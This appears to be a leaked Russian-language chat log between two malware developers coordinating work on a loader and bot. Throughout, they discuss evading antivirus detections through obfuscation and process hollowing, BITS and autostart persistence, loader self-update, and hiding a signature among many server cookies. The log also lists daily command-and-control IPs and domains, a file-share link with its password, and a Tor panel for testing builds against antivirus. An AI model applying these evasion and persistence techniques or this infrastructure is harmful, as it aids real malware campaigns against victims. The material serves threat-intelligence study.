2020-09-22 12:27:52.044532	mushroom	frog	У тебя Wacatac для 32 битной программы только?
2020-09-22 12:28:26.983815	mushroom	frog	Если только для 32 битной, можешь забить на него пока 32 битный загрузчик не используется.
2020-09-22 12:28:45.981495	mushroom	frog	Нужен 64 битный только чистый.
2020-09-22 12:30:05.194074	mushroom	frog	У меня Wacatac и DefenseIvasion и это где то в процессе создание ProcessHollowing, так как я эту функцию закомментировал и не было детектов больше, раскомментировал появились.
2020-09-22 12:30:23.353340	mushroom	frog	И у меня только это для 64 битного загрузчика.
2020-09-22 12:35:56.412236	frog	mushroom	У меня он в 32-разрядной версии. Просто программу с обфускатором делать не пробовал, но один раз попробовал сделать длинную строку в начале функции main, а все остальные модули закомментировал. Так этот детект не пропал, пока не удалил эту строку, хотя там около 80% кода уже не было. Ещё заметил, что он пропадал, когда закомментировал или укоротил длинные строки со списком emercoin-адресов и функцию с большим кол-вом названий dll-библиотек.
2020-09-22 12:40:50.962370	frog	mushroom	Обфускатор вставляет в код последовательность вызовов MOV, если смотреть в окне "Дизассемблированный код".
Может антивируснику это и не нравится, хотя ничего криминального в этом вроде бы нет. Это же просто локальные переменные, по сути.
2020-09-22 12:42:58.485015	frog	mushroom	Похожая ситуация была с детектом Fugrafa антивируса BullGuard. Обфускатор если закомментировать, он пропадает.
2020-09-22 12:43:45.265472	mushroom	frog	А что за обфускатор?
2020-09-22 12:44:28.789406	frog	mushroom	Тот же самый, который ты мне давал: strobfuscator.h
2020-09-22 12:47:08.284160	mushroom	frog	Вот этот попробуй:
Download: https://qaz.im/load/zY7BSQ/fEdaH8   
Delete: https://qaz.im/index.php?a=delete&q=2095202804
Пароль: :PV1[A<8#hC3YLWZX
2020-09-22 12:47:46.380422	mushroom	frog	Первый символ в пароле это ":"
2020-09-22 12:48:08.287699	mushroom	frog	":PV1[A<8#hC3YLWZX"
2020-09-22 12:49:00.978189	mushroom	frog	В начале файла пишешь:
#ifdef OBFUSCATED_STRINGS
#include "MetaString4.h"
using namespace andrivet::ADVobfuscator;
#endif
2020-09-22 12:49:11.292216	mushroom	frog	_STR так же там работает
2020-09-22 12:49:23.885031	mushroom	frog	Там только нету обфускации юникод строк.
2020-09-22 12:52:04.187806	frog	mushroom	Спасибо
2020-09-22 12:53:18.724269	mushroom	frog	Потом мне скажи результат. Если это так, я тогда stdobfuscator доработаю (вставлю туда методы обфускации дополнительные из этого обфускатора, а то там сейчас один всего.
2020-09-22 13:03:34.392522	mushroom	frog	А холловинг делаешь как я код присылал?
2020-09-22 13:04:11.830477	mushroom	frog	Я сейчас у себя его изменил и у меня не появляются детекты Wacatc и DefenseIvasion.
2020-09-22 13:06:09.561569	frog	mushroom	Он немного другой у меня. Технически он тот же, но реализация другая. За основу брал тот, который мне давал Буза и переделывал его под 64-разрядную версию.
2020-09-24 11:34:41.890406	mushroom	frog	Привет.
2020-09-24 11:34:43.649821	mushroom	frog	лоадеры
195.123.237.91
45.143.136.209
91.235.129.64
92.242.40.137
91.235.129.64
92.242.40.137 

бот
88.150.197.173 
185.113.140.186
194.87.232.53 
104.149.170.182 
185.17.123.63
45.138.158.35
2020-09-24 11:35:00.225391	mushroom	frog	На x64 загрузчике детекты есть?
2020-09-24 13:14:03.217468	frog	mushroom	Привет. Закрепление в системе внутри бота ещё делаю.
2020-09-24 13:14:38.451306	frog	mushroom	На 64-разрядной версии не было детектов
2020-09-24 13:27:16.959273	frog	mushroom	Привет. Закрепление в системе внутри бота ещё делаю.
2020-09-24 13:27:16.961416	frog	mushroom	На 64-разрядной версии не было детектов
2020-09-24 13:28:18.159464	mushroom	frog	x86 не нужна. Сдавай стабильную версию x64 Бентли.
2020-09-24 13:36:32.785110	mushroom	frog	Ну и каждый день ему сдавай комплект стабильный который. А там доработки всякие в другой ветке делай, потом сливай в стабильную.
2020-09-24 13:45:24.650383	mushroom	frog	Я тут откопал библиотеку, которая позволяет не использовать msvcruntime http://www.malsmith.net/minicrt/
2020-09-24 13:45:48.589339	mushroom	frog	У меня размер загрузчика в 7 раз уменьшился.
2020-09-24 13:46:59.926973	mushroom	frog	Ещё откопал программу, которая по быстрому обфусцирует сроку если надо https://www.codeproject.com/Articles/1210398/TinyObfuscate-A-small-String-Obfuscator
2020-09-24 13:48:33.950514	frog	mushroom	Спасибо. Посмотрю
2020-09-24 14:02:44.354878	frog	mushroom	По поводу обновления хотел спросить. Если нужно обновить загрузчик, старый загрузчик нужно удалить, а новый сохранить под именем старого?
2020-09-24 14:03:29.518469	mushroom	frog	Старый удалить, скачать и запустить новый.
2020-09-24 14:04:30.483328	mushroom	frog	Тоже самое как команда 10 с сохранением на диск, только ещё в начале старый загрузчик надо удалить.
2020-09-24 14:04:58.768778	mushroom	frog	То есть когда загрузчик запускает бот, он должен передать ему своё имя файла.
2020-09-24 14:05:15.924673	mushroom	frog	Тогда легко удалишь его из бота по команде.
2020-09-24 14:07:49.623229	frog	mushroom	Изначально загрузчики сохраняются в папку Temp? Или другую?
2020-09-24 14:08:29.165700	mushroom	frog	Изначально это что имеется ввиду?
2020-09-24 14:08:52.209815	mushroom	frog	Когда скачиваешь?
2020-09-24 14:09:05.546320	frog	mushroom	Перед самым первым запуском
2020-09-24 14:09:27.741207	mushroom	frog	Это не известно. Пользователь может куда угодно скачать.
2020-09-24 14:10:11.170858	mushroom	frog	Можно же получить своё имя GetModuleHandleFileName
2020-09-24 14:10:35.606170	mushroom	frog	Вот его передавай в бот.
2020-09-24 14:15:40.052864	frog	mushroom	Т.е. в системе закрепляется тот, который будет скопирован в папку Temp? Или загрузчик закрепляет сам себя при любом запуске?
2020-09-24 14:16:47.422909	mushroom	frog	Загрузчик больше себя сам не закрепляет. Его закрепляет бот. Получается загрузчик запустился скачал и запустил бот и всё.
2020-09-24 14:16:57.726959	mushroom	frog	При запуске передал боту своё имя.
2020-09-24 14:17:33.640056	mushroom	frog	Бот получил команду 18 и с помощью имени файла загрузчик, которое ему известно закрепил его.
2020-09-24 14:18:50.020002	mushroom	frog	Обновление так работает, бот скачал загрузчик, удалил старый, запустил новый и завершился. Новый загрузчик скачает бот и запустит по новой. И Вновь запущенный бот будет знать имя файла нового загрузчика.
2020-09-24 14:55:24.478167	frog	mushroom	Т.е. обновление запускается только через админку? Командами "upload loader x64"?
2020-09-24 14:59:13.083897	mushroom	frog	Когда загрузчик запускается он получает версию из админки, если она отличается, он скачивает, запускает её и завершается. Если бот получает команду Force Update Now, то он скачивает файл, который там, удаляет старый загрузчик, запускает скачанный файл и завершает работу.
2020-09-24 15:01:30.276307	mushroom	frog	Если у команды Force Update Now не указан файл, то бот просто запускает старый загрузчик и завершает работу.
2020-09-24 15:01:59.998038	mushroom	frog	Всякие там Upload loader x86 не надо делать пока.
2020-09-24 15:02:11.442222	mushroom	frog	Только Force Update Now.
2020-09-25 12:29:31.752125	mushroom	frog	Привет.
2020-09-25 12:29:33.202348	mushroom	frog	лоадеры
185.90.61.207 
92.242.40.241 
139.60.163.131 
185.242.85.194
195.123.237.153
185.142.99.8

бот
185.164.32.108 
185.244.39.65 
86.104.194.20 
88.150.197.187 
5.9.178.75 
45.138.158.53
2020-09-25 16:38:45.085323	mushroom	frog	Привет.
2020-09-25 16:38:45.087307	mushroom	frog	лоадеры
185.90.61.207 
92.242.40.241 
139.60.163.131 
185.242.85.194
195.123.237.153
185.142.99.8

бот
185.164.32.108 
185.244.39.65 
86.104.194.20 
88.150.197.187 
5.9.178.75 
45.138.158.53
2020-09-28 07:12:29.635142	mushroom	frog	Привет.
2020-09-28 07:12:30.816853	mushroom	frog	лоадеры
62.108.35.194
134.255.254.50 
23.239.84.136 
46.17.107.111 
185.68.93.33 
212.80.219.191

бот
23.239.84.132 
194.5.249.126 
51.89.177.5
104.161.32.103 
107.155.137.7 
37.220.6.119
2020-09-28 08:19:01.909500	mushroom	frog	У тебя детектов нету на автотестах?
2020-09-28 08:23:12.767227	frog	mushroom	Привет. У меня Behavior:Win32/DefenseEvasion появился сегодня. Разбираюсь, в чём причина. С маскировкой что-то не так.
2020-09-28 08:24:20.268574	mushroom	frog	На x64?
2020-09-28 08:26:24.267337	frog	mushroom	Да
2020-09-28 08:28:38.483119	mushroom	frog	Поробуй отключить создание ProcessHollowing в загрузчике и посмотри прошёл ли этот детект.
2020-09-28 08:30:36.069689	mushroom	frog	[11:29:35] <mushroom> На dyncheck сливаются если проверять на динамику? 
[11:29:41] <buza> да, могут 
[11:29:55] <buza> да динчек можно проверить непосредственно перед выдачей в бой 
[11:30:00] <buza> до этого следует пользоваться автотестами
2020-09-28 08:31:13.882527	mushroom	frog	Теперь проверяй на автотестах наших, на динамику, а не на dyncheck.
2020-09-28 08:33:12.609949	frog	mushroom	А как проверять на автотестах?
2020-09-28 08:34:14.951218	frog	mushroom	Это то, что Bentley делает?
2020-09-28 08:34:15.855834	mushroom	frog	Сейчас кое что доделаю расскажу. Пока проверь уходит детект или нет.
2020-09-28 08:34:28.837929	mushroom	frog	Нет.
2020-09-28 09:54:54.115475	mushroom	frog	У тебя в cryptoPanel есть учётная запись?
2020-09-28 09:56:53.520989	frog	mushroom	Нет
2020-09-28 10:04:22.374481	mushroom	frog	Буза сделал тебе учётную запись. Заходи https://ncdzrppa5xl3vw57lk6x3prcj5p63y3m46t4giq6rvdsa3woed3hicid.onion/crpanel
2020-09-28 10:05:09.891433	mushroom	frog	Там выбирай свою вкладку если есть, если нету выбирай вкладку others, загружай туда загрузчик свой.
2020-09-28 10:05:23.013883	mushroom	frog	Нажимай кнопку VM.
2020-09-28 10:05:55.270711	mushroom	frog	Выбирай машины с антивирусами, выбирай внизу AV Only и нажимай OK.
2020-09-28 10:06:26.650184	mushroom	frog	Вот руководство https://mk6gwg6mwnn6if33.onion/attachments/72
2020-09-28 10:07:49.531937	frog	mushroom	Какой логин и пароль?
2020-09-28 10:08:03.229163	frog	mushroom	Нашёл
2020-09-28 10:08:45.874080	mushroom	frog	Там есть вкладка frog?
2020-09-28 10:11:44.095722	frog	mushroom	Зашёл. Справа наверху написано "frog"
2020-09-28 10:12:00.785963	mushroom	frog	Вот туда загружай значит.
2020-09-30 07:28:29.722859	frog	mushroom	Привет. Сегодня какие ip-адреса?
2020-09-30 07:43:21.374483	mushroom	frog	Такие же. Проверь только все на работоспособность.
2020-09-30 07:43:47.549748	mushroom	frog	Проверь что запросы работают на них.
2020-09-30 08:55:15.909492	mushroom	frog	Сделай загрузчик ещё чтобы был примитивны, только скачивает и запускает без сохранения на диск бот.
2020-09-30 08:59:45.713300	mushroom	frog	У тебя DefenseIvasion Бентли сказал. Это точно не обфускатор строк и не обфускатор api. Я сделал загрузчик с другими обфускаторами и без них вообще и детект есть. Я думаю это process hollowing.
2020-09-30 10:13:47.883422	mushroom	frog	У меня тут предположение по поводу DefenseIvasion\Wacatac. Зайди в свойства проекта, общие, имя целевого объекта, и измени текущее имя на что нибудь другое. Я у себя сделал, пока не поймал этих детектов больше.
2020-09-30 10:14:29.774190	mushroom	frog	Ещё нужно собрать комплект для группы 4 обычный, и для группы 7 с примитивным загрузчиком, как я писал выше.
2020-09-30 10:17:40.425534	frog	mushroom	Сегодня отправил Бентли несколько комплектов группы 7
2020-09-30 10:20:00.901928	mushroom	frog	Без детектов?
2020-09-30 10:22:51.551761	frog	mushroom	У себя проверял. Не было детектов.
2020-09-30 10:23:09.914479	mushroom	frog	Для группы 4 сделай ещё.
2020-09-30 10:25:23.899317	frog	mushroom	У меня DefenseIvasion возникал при вызове VirtualAllocEx в модуле маскировки.
2020-09-30 10:27:29.768986	mushroom	frog	Не обфусцированна была?
2020-09-30 10:29:13.682596	frog	mushroom	Всё обфусцировано было. Это, кажется, динамический детект. У меня он возникал только при втором запуске, после перезагрузки ОС или при повторном запуске.
2020-09-30 10:33:44.825783	frog	mushroom	Для группы 4 какие адреса?
Хотелось бы подождать результатов тестирования, потому что функционал существенно изменил, перенёс закрепление в системе.
2020-09-30 10:34:04.001773	frog	mushroom	Адреса для загрузки бота и загрузчика, имею ввиду
2020-09-30 10:34:05.205524	mushroom	frog	Такие же адреса.
2020-09-30 10:34:45.795705	frog	mushroom	Вот эти: /api/v153
2020-09-30 10:34:59.914817	mushroom	frog	А эти. Сейчас скажу.
2020-09-30 10:46:20.042823	mushroom	frog	Loader x86 /api/v97, Loader x64 x86 /api/v98, Bot x86 /api/v99, Bot x64 /api/v100
2020-09-30 10:46:52.861585	mushroom	frog	Loader x86 /api/v97, Loader x64 /api/v98, Bot x86 /api/v99, Bot x64 /api/v100
2020-10-01 09:52:29.612726	frog	mushroom	Привет. Вчера Бентли потестировал несколько комплектов. 3 из 4 работают нормально, но закрепление в системе в Windows 7 что-то не заработало. Попросил его пустить на виртуальную машину. Хотя у себя тестировал на Windows 7, нормально работает
2020-10-01 10:18:35.211305	mushroom	frog	Понял. Какое закрепление там?
2020-10-01 10:18:43.519718	mushroom	frog	Не BITS случайно?
2020-10-01 11:09:08.423757	frog	mushroom	И BITS, и автозагрузка есть.
2020-10-01 11:09:59.509299	mushroom	frog	BITS у него на Win 7 всегда так. Если в bitsadmin видно твою задачу и файл существует, то запуститься через какое то время.
2020-10-01 11:10:19.355256	mushroom	frog	Мой загрузчик у него запускался часа через 2 после перезагрузки.
2020-10-01 11:10:43.470421	mushroom	frog	BITS сразу не запускается после перезагрузки.
2020-10-01 11:13:39.495085	mushroom	frog	И не забудь если BITS то программа всегда должна возвращать 1, чтобы BITS её постоянно перезапускала.
2020-10-01 11:16:34.150382	frog	mushroom	Да, это учёл. Ноль не возвращаю, но 1, - 1 и т.д. (в общем не ноль). Нормально работает. Обязательно единицу?
2020-10-01 11:19:57.630417	mushroom	frog	Your program should return an exit code of zero. If your program does not return an exit code of zero, BITS checks the state of the job. If the program did not cancel or complete the job, BITS calls the program again after the minimum retry delay specified for the job expires.
2020-10-01 11:20:04.038768	mushroom	frog	https://docs.microsoft.com/en-us/windows/win32/api/bits1_5/nf-bits1_5-ibackgroundcopyjob2-setnotifycmdline
2020-10-01 11:20:15.103609	mushroom	frog	Вот описание, главное чтобы не 0 был.
2020-10-01 11:20:32.347990	mushroom	frog	А то запустит один раз и всё.
2020-10-02 08:15:09.383834	frog	mushroom	Привет. Поменялись адреса сегодня?
2020-10-02 08:20:38.876541	mushroom	frog	Нет.
2020-10-06 07:56:40.508839	frog	mushroom	Привет. Какие IP-адреса сегодня?
2020-10-06 08:11:20.464142	mushroom	frog	Пока узнаю.
2020-10-06 08:43:57.765606	mushroom	frog	бот

54.236.253.121 z55gc.com
54.201.135.91  z56gc.com

лоадер


34.230.74.154  z57gc.com
3.135.193.147  z58gc.com
54.190.173.144  z59gc.com
2020-10-06 08:45:24.681964	mushroom	frog	Собирай группу 4 и 7.
2020-10-06 08:45:53.499535	frog	mushroom	z55gc.com - это отдельный адрес?
2020-10-06 08:46:01.781928	mushroom	frog	Одно и тоже.
2020-10-06 08:46:14.881331	mushroom	frog	Как удобнее используй.
2020-10-06 08:47:14.083092	mushroom	frog	У тебя какие группы делаешь?
2020-10-06 08:47:28.665558	mushroom	frog	7 и 41?
2020-10-06 08:47:29.103459	frog	mushroom	7
2020-10-06 08:47:42.868651	frog	mushroom	Только 7
2020-10-06 08:47:45.243839	mushroom	frog	<ajrec> Фрог, группа 41
2020-10-06 08:47:54.925183	mushroom	frog	Не делал?
2020-10-06 08:48:40.702909	frog	mushroom	Нет, делал только 7 и seven. Только такие поручали делать
2020-10-06 08:48:55.541327	mushroom	frog	А 4?
2020-10-06 08:49:08.411671	mushroom	frog	Помнишь я говорил 4 сделать?
2020-10-06 08:50:35.821691	frog	mushroom	Да. Собирался делать ещё на прошлой неделе, но тесты не прошли комплекты группы 7, поэтому разбирался в причинах
2020-10-06 08:50:53.006642	mushroom	frog	Всё разобрались. 41 не твоя.
2020-10-06 08:51:10.550138	mushroom	frog	Делай 4 и 7. И Бентли сдавай.
2020-10-06 08:51:22.391599	frog	mushroom	Хорошо
2020-10-07 07:19:52.351183	frog	mushroom	Привет. Какие IP-адреса сегодня?
2020-10-07 07:44:01.483408	mushroom	frog	Привет.
2020-10-07 07:44:03.468202	mushroom	frog	бот

52.12.203.202 x55gc.com
54.162.201.128  x56gc.com

лоадер

13.58.213.252   x57gc.com
3.81.126.82   x58gc.com
54.213.49.29   x59gc.com
2020-10-08 07:54:21.245477	mushroom	frog	Привет.
2020-10-08 07:54:22.934514	mushroom	frog	бот

3.235.164.215  ds43x1.com
18.224.51.180  ds44x1.com


лоадер


18.207.182.253  ds45x1.com
35.160.125.254  ds46x1.com
3.238.77.5  ds47x1.com
2020-10-08 07:55:39.821667	frog	mushroom	Привет
2020-10-08 08:07:54.585435	mushroom	frog	Тут доработка для лоадера и для бота. Надо сделать так чтобы все полученные куки проверялись как подпись.
2020-10-08 08:08:32.516735	mushroom	frog	Теперь много куки будет приходить от сервера, подпись будет спрятана среди них.
2020-10-08 08:09:22.571436	mushroom	frog	Приходит так:
Set-Cookie: ohf29h1f[80h
Set-Cookie: 96302986013-08
Set-Cookie: m\poj\ojmf2j]09§h=8§y-97§fgfb§91fbp8b
Set-Cookie: h'oih'oin'oivno'vhohp98h0j[pkarnv;bka\pgj'p
Set-Cookie: nm;kn'pRH'IHJGR'onvLM'Pvj'oivwehe[8h03ghjf]0h]0fn
2020-10-08 08:10:53.154797	mushroom	frog	Их все прогоняй как подпись для даты, до того как дата не провериться, не одна не подошла значит подпись не проверена.
2020-10-08 08:11:46.361974	mushroom	frog	В админке на вкладке Groups теперь есть поле Cookies Names
2020-10-08 08:12:37.285055	mushroom	frog	Туда пиши имена для куки (только имена). Не меньше 5 штук, разделитель это новая строка.
2020-10-08 08:13:01.530842	frog	mushroom	Хорошо
2020-10-12 14:45:14.552134	frog	mushroom	Привет. Какие сегодня IP-адреса?
2020-10-12 15:00:27.258350	mushroom	frog	бот

54.144.104.189  sawssale.com
3.22.250.104 dustsinc.com

loader

34.220.8.194 justsinc.com
18.212.74.215 onlinewells.com
3.128.197.68  funqwik.com
2020-10-12 15:50:21.019300	mushroom	frog	Ты кстати сделал чтобы все куки проверялись как подпись? Если сделал пиши во вкладке Groups, в поле Cookies Names имена для куки, в которых будет спрятана подпись. Минимум 5 штук, разделитель новая строка. Во всех группах своих так сделай.
2020-10-14 11:27:26.219054	frog	mushroom	Привет. Какие сегодня IP-адреса?
На redmine что-то не могу зайти. Там адрес не поменялся?
2020-10-14 11:28:34.549423	mushroom	frog	Я тоже не могу зайти.
2020-10-14 11:28:45.016417	mushroom	frog	bot

18.188.194.80 labelcs.com
54.91.36.142  freedubcs.com

loader

54.245.74.151 titlecs.com
54.145.79.240 mixcinc.com
3.138.117.231 nicknamec.com
2020-10-15 08:08:02.023388	frog	mushroom	Привет. Сегодня IP-адреса изменились?
2020-10-15 08:26:41.813566	mushroom	frog	Вчерашние адреса не работают. Используй старые:
bot

3.137.180.197  cuprinc.com
3.238.75.236  shophoof.com

loader

34.221.202.231  breezdesign.com
54.83.253.135 hotenlighten.com
18.191.38.26 onebulks.com
2020-10-15 08:26:56.098249	mushroom	frog	Проверь какие работают из них и спользуй.
2020-10-15 08:27:14.925250	mushroom	frog	34.221.202.231  breezdesign.com этот не работает вроде.
2020-10-15 15:26:42.820507	frog	mushroom	Не появились за сегодня новые IP-адреса?
2020-10-15 15:27:29.683838	mushroom	frog	bot

18.188.194.80 labelcs.com
54.91.36.142  freedubcs.com

loader

54.245.74.151 titlecs.com
54.145.79.240 mixcinc.com
3.138.117.231 nicknamec.com
2020-10-15 15:27:49.703701	mushroom	frog	Эти я давал, не помню.
2020-10-15 15:28:22.478891	mushroom	frog	Эти рабочие.
2020-10-15 15:28:38.746327	frog	mushroom	Хорошо, спасибо
2020-10-16 10:06:44.100092	mushroom	frog	Привет. Теперь у тебя руководитель kaktus@q3mcco35auwcstmt.onion
2020-10-16 10:07:02.999923	mushroom	frog	Ему напиши.
2020-11-02 14:15:55.568922	mushroom	frog	Привет. У тебя есть резервная учётная запись для связи?
2020-11-02 14:16:28.571787	frog	mushroom	Привет!
crazy_digger@jabber.ru
2020-11-02 14:17:13.943863	mushroom	frog	Передал.
